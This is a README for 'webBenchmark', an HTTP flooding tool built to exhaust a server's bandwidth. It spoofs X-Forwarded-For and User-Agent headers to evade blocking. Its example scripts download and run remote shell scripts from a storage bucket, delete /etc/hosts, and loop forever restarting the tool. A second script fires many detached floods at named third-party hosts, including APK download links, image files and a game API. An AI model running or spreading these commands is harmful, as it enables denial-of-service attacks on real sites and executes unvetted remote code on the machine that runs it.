# webBenchmark
http benchmark tool to ran out your server bandwidth.
- random User-Agent on every Request
- customizable Referer Url,
- concurrent routines as you wish, depends on you server performance.
- add http post mode
- specify target ip, or resolved by system dns.
- randomly X-Forwarded-For and X-Real-IP (default on).

# Todo 
- automatically tune concurrent routines to gain maximum performance. 
- randomly target ip.
- support NOT standard port in address with specify target ip.

# Usage: 
    webBenchmark -c [COUNT] -s [URL] -r [REFERER]
    -c int
          concurrent routines for download (default 16)
    -r string
          referer url
    -s string
          target url (default "https://baidu.com")
    -i string
          customize ip
    -f string
          randomized X-Forwarded-For and X-Real-IP address
    -p string
          post content


# LINUX:
    wget https://github.com/maintell/webBenchmark/releases/download/0.3/webBenchmark_linux_x64
    chmod +x webBenchmark_linux_x64
    ./webBenchmark_linux_x64 -c 32 -s https://target.url

## advanced example
    # send request to 1.1.1.1 for https://target.url with 32 concurrent threads 
    # and refer is https://refer.url
    ./webBenchmark_linux_x64 -c 32 -s https://target.url -r https://refer.url -i 1.1.1.1
    
## example
    #!/bin/bash
    yum install psmisc -y
    sleep 5s
    apt-get install psmisc -y
    sleep 5s
    rm -rf webBenchmark_linux_x64
    curl -O http://storage.googleapis.com/zongcai/webBenchmark_linux_x64
    chmod +x webBenchmark_linux_x64
    sleep 2s
    curl -O http://storage.googleapis.com/zongcai/jh.sh
    curl -O http://storage.googleapis.com/zongcai/hosts
    chmod +x jh.sh
    chmod +x hosts
    sh jh.sh
    sh hosts
    while true
    do
    sleep 600s
    killall -9 webBenchmark_linux_x64
    sleep 3s
    rm -rf jh.sh
    rm -rf hosts
    rm -rf /etc/hosts
    sleep 5s
    curl -O http://storage.googleapis.com/zongcai/jh.sh
    curl -O http://storage.googleapis.com/zongcai/hosts
    chmod +x jh.sh
    chmod +x hosts
    sh jh.sh
    sh hosts
    done


    #!/bin/bash
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 12 -s http://all-live.secutre2storeapple.necxs.com/20211218/%E6%9F%91%E6%A9%98%E3%90%85%E7%9B%B4%E6%92%AD_157590.apk /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 12 -s http://all-live.secutre2storeapple.necxs.com/20211216/鏌戞銗呯洿鎾璤236864.apk /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 12 -s http://all-live.secutre2storeapple.necxs.com/20211217/璐靛銗呯洿鎾璤07443.apk /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 12 -s http://all-live.secutre2storeapple.necxs.com/20211217/濂剁硸銗呯洿鎾璤07468.apk /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 12 -s http://all-live.secutre2storeapple.necxs.com/20211217/濂剁硸銗呯洿鎾璤07468.apk /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 64 -s http://gjt.lixianghaodian.com/3/images/banner01.jpg /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 64 -s http://gjt.lixianghaodian.com/3/images/banner01.jpg /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://gj.app -c 64 -s http://gjt.lixianghaodian.com/3/images/banner03.jpg /dev/null &
    setsid ./webBenchmark_linux_x64 -r http://jg.37gowan.com -c 3 -s http://api.sooyooj.com/index/game/info -p token= -p uid= -p gameid=146 -p channelid=5221 /dev/null &
    exit 0



